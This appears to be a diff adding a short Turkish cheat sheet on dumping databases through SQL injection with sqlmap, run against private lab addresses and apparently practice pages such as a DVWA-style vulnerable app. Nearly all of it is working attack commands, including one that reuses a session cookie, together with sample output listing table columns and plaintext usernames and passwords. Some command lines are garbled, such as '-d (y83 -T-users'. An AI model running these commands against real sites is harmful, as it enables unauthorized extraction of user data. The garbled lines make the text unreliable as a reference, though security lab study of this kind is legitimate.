@@ -1,0 +1,37 @@
+SQL Database üzerinden Dump alma
+
+-p parametresi ile parametre belirtebilirsin.
+sqlmap -u "http://192.168.187.149/sqli/example4.php?id=2" -p id --dbs
+sqlmap -u "http://192.168.187.149/sqli/example4.php?id=2" -p id -D exercises -tables  
+-p olmadan kullanım
+sqlmap -u "http://192.168.187.149/sqli/example4.php?id=2" -d (y83 -T-users --column
+
+sqlmap -u "http://192.168.187.149/sqli/example4.php?id=2" -p id -D exercises -T users --column --dump
+Örnek Çıktı:
+Database: exercises
+Table: users
+[5 columns]
++---------+-------------+
+| Column  | Type        |
++---------+-------------+
+| age     | int(11)     |
+| groupid | int(11)     |
+| id      | int(11)     |
+| name    | varchar(50) |
+| r5ec    | varchar(50) |
++---------+-------------+
+
+--Cookie üzerinden tarama gerçekleştirme
+Kaynak koduna geç Network Headers alanından Cookie ile ilerle.
+
+Örnek Kullanım
+sqlmap -u http://192.168.187.154/vulnerabilities/sqli/?id=3 --cookie="PHPSESSID=ki993ru0l51ddm0man5kscjht1; security=low" -D Test -T info --dump
+Database: Test
+Table: info
+[4 entries]
++----+---------+-----+-------+---------+
+| id | groupid | age | name  | passwd  |
++----+---------+-----+-------+---------+
+| 1  | 10      | 10  | admin | qwerty  |
+| 2  | 0       | 30  | root  | uiop    | |
++----+---------+-----+-------+---------+
